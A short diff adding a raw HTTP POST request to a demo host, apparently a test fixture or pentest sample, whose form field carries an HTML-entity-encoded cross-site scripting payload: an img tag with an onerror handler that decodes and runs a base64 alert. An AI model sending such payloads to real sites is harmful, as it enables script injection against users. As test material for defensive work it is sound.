@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Connection: close
+
+path=&#x3C;img src=&#x22;x&#x22; onerror=&#x22;alert(atob(&#x27;YWxlcnQoMSk=&#x27;))&#x22;&#x3E;
